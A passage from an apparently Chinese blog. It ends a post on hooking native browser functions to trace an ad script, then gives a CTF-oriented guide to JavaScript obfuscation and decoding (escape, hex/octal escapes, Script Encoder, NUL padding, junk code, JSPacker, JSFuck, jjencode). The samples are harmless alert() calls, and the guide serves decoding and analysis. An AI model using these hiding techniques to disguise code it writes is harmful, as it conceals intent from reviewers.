<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">// Used to resolve the internal `[[Class]]` of values</div><div class="line">var toString = Object.prototype.toString;</div><div class="line"></div><div class="line">// Used to resolve the decompiled source of functions</div><div class="line">var fnToString = Function.prototype.toString;</div><div class="line"></div><div class="line">// Used to detect host constructors (Safari &gt; 4; really typed array specific)</div><div class="line">var reHostCtor = /^\[object .+?Constructor\]$/;</div><div class="line"></div><div class="line">// Compile a regexp using a common native method as a template.</div><div class="line">// We chose `Object#toString` because there&apos;s a good chance it is not being mucked with.</div><div class="line">var reNative = RegExp(&apos;^&apos; +</div><div class="line">  // Coerce `Object#toString` to a string</div><div class="line">  String(toString)</div><div class="line">  // Escape any special regexp characters</div><div class="line">  .replace(/[.*+?^$&#123;&#125;()|[\]\/\\]/g, &apos;\\$&amp;&apos;)</div><div class="line">  // Replace mentions of `toString` with `.*?` to keep the template generic.</div><div class="line">  // Replace thing like `for ...` to support environments like Rhino which add extra info</div><div class="line">  // such as method arity.</div><div class="line">  .replace(/toString|(function).*?(?=\\\()| for .+?(?=\\\])/g, &apos;$1.*?&apos;) + &apos;$&apos;</div><div class="line">);</div><div class="line"></div><div class="line">function isNative(value) &#123;</div><div class="line">  var type = typeof value;</div><div class="line">  return type == &apos;function&apos;</div><div class="line">    // Use `Function#toString` to bypass the value&apos;s own `toString` method</div><div class="line">    // and avoid being faked out.</div><div class="line">    ? reNative.test(fnToString.call(value))</div><div class="line">    // Fallback to a host object check because some environments will represent</div><div class="line">    // things like typed arrays as DOM methods which may not conform to the</div><div class="line">    // normal native pattern.</div><div class="line">    : (value &amp;&amp; type == &apos;object&apos; &amp;&amp; reHostCtor.test(toString.call(value))) || false;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后结合网上的资料，写出了递归覆盖内置函数的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">function wrapit(e) &#123;</div><div class="line">    if (e.__proto__) &#123;</div><div class="line">        wrapit(e.__proto__);</div><div class="line">    &#125;</div><div class="line">    for (var a in e) &#123;</div><div class="line">        try &#123;</div><div class="line">            e[a];</div><div class="line">        &#125; catch (e) &#123;</div><div class="line">            // pass</div><div class="line">            continue;</div><div class="line">        &#125;</div><div class="line">        var prop = e[a];</div><div class="line">        if (!prop || prop._w) continue;</div><div class="line"></div><div class="line">        prop = e[a];</div><div class="line">        if (typeof prop == &apos;function&apos; &amp;&amp; isNative(prop)) &#123;</div><div class="line">            e[a] = (function (name, func) &#123;</div><div class="line">                return function () &#123;</div><div class="line">                    var args = [].splice.call(arguments,0); // convert arguments to array</div><div class="line">                    if (false &amp;&amp; name == &apos;getElementsByTagName&apos; &amp;&amp; args[0] == &apos;iframe&apos;) &#123;</div><div class="line">                    &#125; else &#123;</div><div class="line">                        console.error((new Date).toISOString(), [this], name, args);</div><div class="line">                    &#125;</div><div class="line">                    if (name == &apos;querySelectorAll&apos;) &#123;</div><div class="line">                        //alert(&apos;querySelectorAll&apos;);</div><div class="line">                    &#125;</div><div class="line">                    return func.apply(this, args);</div><div class="line">                &#125;;</div><div class="line">            &#125;)(a, prop);</div><div class="line">            e[a]._w = true;</div><div class="line">        &#125;;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用的时候只需要：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wrapit(window);</div><div class="line">wrapit(document);</div></pre></td></tr></table></figure>
<p>然后模拟一下正常的操作，触发 PopUnder 就可以看到它的调用过程了。</p>
<hr>
<p>参考资料：</p>
<p><a href="https://blog.nettitude.com/uk/beginners-guide-obfuscation" target="_blank" rel="external">A Beginners’ Guide to Obfuscation</a><br><a href="https://stackoverflow.com/questions/6598945/detect-if-function-is-native-to-browser" target="_blank" rel="external">Detect if function is native to browser</a><br><a href="https://davidwalsh.name/detect-native-function" target="_blank" rel="external">Detect if a Function is Native Code with JavaScript</a></p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF比赛中关于javascript的总结]]></title>
      <url>/2017/11/12/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ejavascript%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF比赛中MISC、CRYPTO、WEB中，经常会遇到有关js方面的题目，这些题目内容很杂，难度不一，所以成套的体系很难总结出来。所以本文只是笔者根据个人经历，总结的一套较为行之有效的工具书！</p>
<h2 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h2><h3 id="0x2-1-JavaScript简介"><a href="#0x2-1-JavaScript简介" class="headerlink" title="0x2.1 JavaScript简介"></a>0x2.1 JavaScript简介</h3><p>JavaScript一种动态类型、弱类型、基于原型的客户端脚本语言，用来给HTML网页增加动态功能。</p>
<blockquote>
<p>动态：在运行时确定数据类型。变量使用之前不需要类型声明，通常变量的类型是被赋值的那个值的类型。</p>
<p>弱类：计算时可以不同类型之间对使用者透明地隐式转换，即使类型不正确，也能通过隐式转换来得到正确的类型。</p>
<p>原型：新对象继承对象（作为模版），将自身的属性共享给新对象，模版对象称为原型。这样新对象实例化后不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。</p>
</blockquote>
<p>PS：新对象指函数，模版对象是实例对象，实例对象是不能继承原型的，函数才可以的。</p>
<h3 id="0x2-2-JavaScript组成部分"><a href="#0x2-2-JavaScript组成部分" class="headerlink" title="0x2.2 JavaScript组成部分"></a>0x2.2 JavaScript组成部分</h3><h4 id="0x2-2-1-ECMAScript（核心）"><a href="#0x2-2-1-ECMAScript（核心）" class="headerlink" title="0x2.2.1 ECMAScript（核心）"></a>0x2.2.1 ECMAScript（核心）</h4><p>作为核心，它规定了语言的组成部分：语法、类型、语句、关键字、保留字、操作符、对象。</p>
<p>具体参考es6  <a href="http://es6.ruanyifeng.com/" target="_blank" rel="external">http://es6.ruanyifeng.com/</a></p>
<p>如果想查看每种浏览器的兼容性情况，可以参考以下博客</p>
<p>es5兼容性： <a href="http://kangax.github.io/compat-table/es5/" target="_blank" rel="external">http://kangax.github.io/compat-table/es5/</a></p>
<p>es6兼容性： <a href="http://kangax.github.io/compat-table/es6/" target="_blank" rel="external">http://kangax.github.io/compat-table/es6/</a></p>
<h4 id="0x2-2-2-DOM（文档对象模型）"><a href="#0x2-2-2-DOM（文档对象模型）" class="headerlink" title="0x2.2.2 DOM（文档对象模型）"></a>0x2.2.2 DOM（文档对象模型）</h4><p>DOM把整个页面映射为一个多层节点结果，开发人员可借助DOM提供的API，轻松地删除、添加、替换或修改任何节点。</p>
<h4 id="0x2-2-3-BOM-（浏览器对象模型）"><a href="#0x2-2-3-BOM-（浏览器对象模型）" class="headerlink" title="0x2.2.3 BOM （浏览器对象模型）"></a>0x2.2.3 BOM （浏览器对象模型）</h4><p>支持可以访问和操作浏览器窗口的浏览器对象模型，开发人员可以控制浏览器显示的页面以外的部分。</p>
<h3 id="0x2-3-javascript中部分常见的书写方式"><a href="#0x2-3-javascript中部分常见的书写方式" class="headerlink" title="0x2.3 javascript中部分常见的书写方式"></a>0x2.3 javascript中部分常见的书写方式</h3><p>说实在的，很多小伙伴表示javascript的表达方式太多了，而且其中有太多不为人知的利用策略。所以熊师傅给出一种套路，翻看工具书，上面已经给出了es6的参考博客！</p>
<h4 id="0x2-3-1-对象的变量或函数"><a href="#0x2-3-1-对象的变量或函数" class="headerlink" title="0x2.3.1 对象的变量或函数"></a>0x2.3.1 对象的变量或函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">var</span> s = <span class="string">"class"</span>;</div><div class="line">&gt; s.length	<span class="comment">// 等价于 s["length"]</span></div><div class="line"><span class="number">5</span></div><div class="line">&gt; s.substr(<span class="number">2</span>,<span class="number">2</span>)		<span class="comment">// 等价于 s["substr"](2,2)</span></div><div class="line"><span class="keyword">as</span></div></pre></td></tr></table></figure>
<p>这里说明了javascript中对象访问属性有两种方法</p>
<p>obj.paramName，使用.访问</p>
<p>obj[parameName]，使用中括号属性名访问</p>
<h4 id="0x2-3-2-类和函数的定义与使用"><a href="#0x2-3-2-类和函数的定义与使用" class="headerlink" title="0x2.3.2 类和函数的定义与使用"></a>0x2.3.2 类和函数的定义与使用</h4><ol>
<li><p>构造函数法定义类</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">this</span>.name = <span class="string">"大毛"</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 类的属性和方法</span></div><div class="line">Cat.prototype.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="string">"喵喵喵"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Cat();</div><div class="line">alert(cat1.name); <span class="comment">// 大毛</span></div></pre></td></tr></table></figure>
</li>
<li><p>Object.create()法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">name</span>: <span class="string">"大毛"</span>,</div><div class="line">	<span class="attr">makeSound</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = <span class="built_in">Object</span>.create(Cat);</div><div class="line">alert(cat1.name); <span class="comment">// 大毛</span></div><div class="line">cat1.makeSound(); <span class="comment">// 喵喵喵</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 兼容性考虑, 自己定义一个create函数</span></div><div class="line"><span class="keyword">if</span> (!<span class="built_in">Object</span>.create) &#123;</div><div class="line">	<span class="built_in">Object</span>.create = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>) </span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">		F.prototype = o;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> F();</div><div class="line">	&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>极简主义法（用得最多）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;		<span class="comment">// createNew为构造函数，定义一个实例对象，把实例对象作为返回值</span></div><div class="line">		<span class="keyword">var</span> cat = &#123;&#125;;</div><div class="line">		cat.name = <span class="string">"大毛"</span>;</div><div class="line">		cat.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> cat;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = Cat.createNew();</div><div class="line">cat1.makeSound(); <span class="comment">// 喵喵喵</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 此处演示的是继承</span></div><div class="line"><span class="keyword">var</span> Animal = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">var</span> animal = &#123;&#125;;</div><div class="line">		animal.sleep = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"睡懒觉"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> animal;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">var</span> cat = Animal.createNew();</div><div class="line">		cat.name = <span class="string">"大毛"</span>;</div><div class="line">		cat.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> cat;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = Cat.createNew();</div><div class="line">cat1.sleep(); <span class="comment">// 睡懒觉</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="CTF实践"><a href="#CTF实践" class="headerlink" title="CTF实践"></a>CTF实践</h2><h3 id="0x3-1-js压缩与解压缩"><a href="#0x3-1-js压缩与解压缩" class="headerlink" title="0x3.1 js压缩与解压缩"></a>0x3.1 js压缩与解压缩</h3><h4 id="0x3-1-1-js压缩"><a href="#0x3-1-1-js压缩" class="headerlink" title="0x3.1.1 js压缩"></a>0x3.1.1 js压缩</h4><p>压缩js文件可以减少文件体积方便传输，还可以让别人看不懂。</p>
<p>简单的压缩一般是：删除注释和空白符，替换变量名。</p>
<p>更激进点的做法还包括：删除无用代码，内联函数，等价语句替换等。 </p>
<p>开始压缩的时候必须要做到以下几点：</p>
<blockquote>
<ol>
<li>压缩前的代码格式要标准。因为去掉换行与空格时，所有语句就变成一行了，如果你的代码有瑕疵（比如某行少了个分号），那就会导致整个文件报错。当然，现在有的压缩工具已经比较智能了。</li>
<li>备份原文件</li>
<li>压缩很可能不会一次成功，一般要多试，多改</li>
</ol>
</blockquote>
<p>压缩js的工具，常见的有：<a href="http://ganquan.info/yui/" target="_blank" rel="external">YUI Compressor</a>、<a href="https://tool.css-js.com/" target="_blank" rel="external">UglifyJS</a>、<a href="(http://closure-compiler.appspot.com/">Google Closure Compiler</a>) 、<a href="https://tool.css-js.com/" target="_blank" rel="external">JSMin</a>等。</p>
<h4 id="0x3-1-2-js解压缩"><a href="#0x3-1-2-js解压缩" class="headerlink" title="0x3.1.2 js解压缩"></a>0x3.1.2 js解压缩</h4><p>那么既然能压缩，那也应该能够解压缩，但是需要注意的是，如果按照上面给的标准，我们无法实现完全的解压缩，但是可以还原出一个多行且具有鲜明的层次化结构的js代码。</p>
<p>js解压缩的工具有：chrome开发者模式支持解压缩</p>
<p>​            菜鸟工具  <a href="https://c.runoob.com/front-end/51" target="_blank" rel="external">https://c.runoob.com/front-end/51</a></p>
<p>​            Chinaz    <a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="external">http://tool.chinaz.com/js.aspx</a></p>
<p>​            tool.lu在线工具    <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>​            CSS-JS    <a href="https://tool.css-js.com/" target="_blank" rel="external">https://tool.css-js.com/</a></p>
<h3 id="0x3-2-js加密与解密"><a href="#0x3-2-js加密与解密" class="headerlink" title="0x3.2 js加密与解密"></a>0x3.2 js加密与解密</h3><h4 id="0x3-2-1-escape加密-unescape解密"><a href="#0x3-2-1-escape加密-unescape解密" class="headerlink" title="0x3.2.1 escape加密\unescape解密"></a>0x3.2.1 escape加密\unescape解密</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//加密</span></div><div class="line">&gt; <span class="built_in">escape</span>(<span class="string">'alert("黑客防线"); '</span>)</div><div class="line"><span class="string">"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B"</span></div><div class="line"></div><div class="line"><span class="comment">//解密</span></div><div class="line">&gt; <span class="built_in">unescape</span>(<span class="string">"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B"</span>)</div><div class="line"><span class="string">"alert("</span>黑客防线<span class="string">"); "</span></div></pre></td></tr></table></figure>
<p>工具   <a href="http://www.haokuwang.com/unescape.htm" target="_blank" rel="external">http://www.haokuwang.com/unescape.htm</a></p>
<h4 id="0x3-2-2-转义字符加解密"><a href="#0x3-2-2-转义字符加解密" class="headerlink" title="0x3.2.2 转义字符加解密"></a>0x3.2.2 转义字符加解密</h4><p>转义字符&quot;&quot;，对于JavaScript提供了一些特殊字符如：n （换行）、 r （回车）、&#39; （单引号）等应该是有所了解 </p>
<p>的吧？其实&quot;&quot;后面还可以跟八进制或十六进制的数字，如字符&quot;a&quot;则可以表示为：&quot;141&quot;或&quot;x61&quot;（注意是小写字符&quot;x&quot;），至于双字节字符如汉字&quot;黑&quot;则仅能用十六进制表示为&quot;u9ED1&quot;（注意是小写字符&quot;u&quot;），其中字符&quot;u&quot;表示是双字节字符，根据这个原理例子代码则可以表示为： </p>
<p>八进制转义字符串如下: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用console.log 或者 alert 或者confirm 或者 prompt调试 或者 document.write</span></div><div class="line">&gt; <span class="built_in">console</span>.log(<span class="string">"\141\154\145\162\164\50\42\u9ED1\u5BA2\u9632\u7EBF\42\51\73"</span>)</div><div class="line">alert(<span class="string">"黑客防线"</span>);</div></pre></td></tr></table></figure>
<p>十六进制转义字符串如下: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="built_in">console</span>.log(<span class="string">"\x61\x6C\x65\x72\x74\x28\x22\u9ED1\u5BA2\u9632\u7EBF\x22\x29\x3B"</span>)</div><div class="line">alert(<span class="string">"黑客防线"</span>);</div></pre></td></tr></table></figure>
<p>常见工具：    工具包-&gt;其他辅助工具-&gt;编码转换</p>
<p>​            <a href="http://web2hack.org/xssee/" target="_blank" rel="external">http://web2hack.org/xssee/</a></p>
<h4 id="0x3-2-3-Script-Encoder来进行编码"><a href="#0x3-2-3-Script-Encoder来进行编码" class="headerlink" title="0x3.2.3 Script Encoder来进行编码"></a>0x3.2.3 Script Encoder来进行编码</h4><p>脚本编码器Script Encoder是Microsoft出品的脚本编码器。这里需要调用控件Scripting.Encoder完成的编码！由于很多电脑上没有安装这个控件，所以很多时候，你的主机运行不起来这个js代码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=<span class="string">"JavaScript"</span>&gt; </div><div class="line"><span class="keyword">var</span> Senc=<span class="keyword">new</span> ActiveXObject(<span class="string">"Scripting.Encoder"</span>); </div><div class="line"><span class="keyword">var</span> code=<span class="string">'12345'</span>; </div><div class="line"><span class="keyword">var</span> Encode=Senc.EncodeScriptFile(<span class="string">".htm"</span>,code,<span class="number">0</span>,<span class="string">""</span>); </div><div class="line">alert(Encode); </div><div class="line">&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>编码后的结果如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE="JScript.Encode"&gt;#@~^BQAAAA==qy&amp;*l/wAAAA==^#~@&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>解密方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=&quot;JScript.Encode&quot;&gt; </div><div class="line">function decode() </div><div class="line">alert(decode.toString()); </div><div class="line">&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>它是原理是：编码后的代码运行前IE会先对其进行解码，如果我们先把加密的代码放入一个自定义函数如上面的decode()中，然后对自定义函数decode调用toString()方法，得到的将是解码后的代码！ </p>
<p>如果你觉得这样编码得到的代码LANGUAGE属性是JScript.Encode，很容易让人识破，那么还有一个几乎不为人知的window对象的方法execScript() ，其原形为： window.execScript( sExpression, sLanguage)</p>
<p>ps: 现在的es6中，已经不支持execScript了!!!</p>
<p>参数：<br>sExpression: 必选项。字符串(String)。要被执行的代码。<br>sLanguage　: 必选项。字符串(String)。指定执行的代码的语言。默认值为 Microsoft JScript </p>
<p><strong>工具选择</strong>：</p>
<p>加密工具： srcenc.exe</p>
<p>解密工具：srcdec18-VC8.exe</p>
<h4 id="0x3-2-4-任意添加NUL空字符（十六进制00H）"><a href="#0x3-2-4-任意添加NUL空字符（十六进制00H）" class="headerlink" title="0x3.2.4  任意添加NUL空字符（十六进制00H）"></a>0x3.2.4  任意添加NUL空字符（十六进制00H）</h4><p>一次偶然的实验，使我发现在HTML网页中任意位置添加任意个数的&quot;空字符&quot;，IE照样会正常显示其中的内容，并正常执行其中的JavaScript 代码，而我们在用一般的编辑器查看时，添加的&quot;空字符&quot;会显示形如空格或黑块，使得原码很难看懂，如用记事本查看&quot;空字符&quot;则会变成&quot;空格&quot;，</p>
<p>利用这个原理加密结果如下：（其中显示的&quot;空格&quot;代表&quot;空字符&quot;） </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;S C RI P T L ANG U A G E =<span class="string">" J a v a S c r i p t "</span>&gt; </div><div class="line">a l er t (<span class="string">" S w e e t"</span>) ; </div><div class="line">&lt; / SC R I P T&gt;</div></pre></td></tr></table></figure>
<p>如何？是不是显得乱七八糟的？如果不知道方法的人很难想到要去掉里面的&quot;空字符&quot;（00H）的！</p>
<h4 id="0x3-2-5-无用内容混乱以及换行空格TAB大法"><a href="#0x3-2-5-无用内容混乱以及换行空格TAB大法" class="headerlink" title="0x3.2.5 无用内容混乱以及换行空格TAB大法"></a>0x3.2.5 无用内容混乱以及换行空格TAB大法</h4><p>在JAVASCRIPT代码中我们可以加入大量的无用字符串或数字，以及无用代码和注释内容等等，使真正的有用代码埋没在其中，并把有用的 代码中能加入换行、空格、TAB的地方加入大量换行、空格、TAB，并可以把正常的字符串用&quot;&quot;来进行换行，这样就会使得代码难以看懂。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT LANGUAGE=<span class="string">"JavaScript"</span>&gt; </div><div class="line"><span class="string">"xajgxsadffgds"</span>;<span class="number">1234567890</span> </div><div class="line"><span class="number">625623216</span>;<span class="keyword">var</span> $=<span class="number">0</span>;alert<span class="comment">//@$%%&amp;*()(&amp;(^%^ </span></div><div class="line"><span class="comment">//cctv function// </span></div><div class="line">(<span class="comment">//hhsaasajx xc </span></div><div class="line"><span class="comment">/* </span></div><div class="line">asjgdsgu*/ </div><div class="line"><span class="string">"Sweet"</span><span class="comment">//ashjgfgf </span></div><div class="line"><span class="comment">/* </span></div><div class="line">@#%$^&amp;%$96667r45fggbhytjty </div><div class="line">*/ </div><div class="line"><span class="comment">//window </span></div><div class="line">) </div><div class="line">;<span class="string">"#@$#%@#432hu"</span>;<span class="number">212351436</span> </div><div class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></div></pre></td></tr></table></figure>
<h4 id="0x3-2-6-JSPacker加解密"><a href="#0x3-2-6-JSPacker加解密" class="headerlink" title="0x3.2.6 JSPacker加解密"></a>0x3.2.6 JSPacker加解密</h4><p>这类最突出的特点就是eval(function(p,a,c,k,e,r).....</p>
<p>所以当你遇到这类代码的时候，不妨试着使用一下JSPacker解密工具</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//源代码</span></div><div class="line"><span class="built_in">eval</span>(<span class="number">1</span>);</div><div class="line"><span class="comment">//加密后代码</span></div><div class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)</span>&#123;e=<span class="built_in">String</span>;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)r[c]=k[c]||c;k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'0(1);'</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="string">'alert|'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</div></pre></td></tr></table></figure>
<p>加解密工具：</p>
<p>tool.lu在线解密        <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>CSS-JS                <a href="https://tool.css-js.com/" target="_blank" rel="external">https://tool.css-js.com/</a></p>
<p>手动解密：            其实将加密后的代码美化之后，会发现return p语句，在此之前，你只需要加上一句console.log(p)就能获得对应的解密后代码。</p>
<h4 id="0x3-2-7-JSFuck加解密"><a href="#0x3-2-7-JSFuck加解密" class="headerlink" title="0x3.2.7 JSFuck加解密"></a>0x3.2.7 JSFuck加解密</h4><p>JSFuck 可以让你只用 6 个字符 <code>[ ]( ) ! +</code> 来编写 JavaScript 程序，所以很明显</p>
<p>jsfuck加密工具        <a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></p>
<p>jsfuck解密工具        <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/" target="_blank" rel="external">https://enkhee-osiris.github.io/Decoder-JSFuck/</a></p>
<p>​            手动：    其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可</p>
<h4 id="0x3-2-8-jjencode-aaencode"><a href="#0x3-2-8-jjencode-aaencode" class="headerlink" title="0x3.2.8 jjencode/aaencode"></a>0x3.2.8 jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，但是符号大多数为\$+~[]\￥等</p>
<p>加密工具                <a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="external">http://utf-8.jp/public/jjencode.html</a></p>
<p>解密工具                <a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="external">https://github.com/jacobsoo/Decoder-JJEncode</a></p>
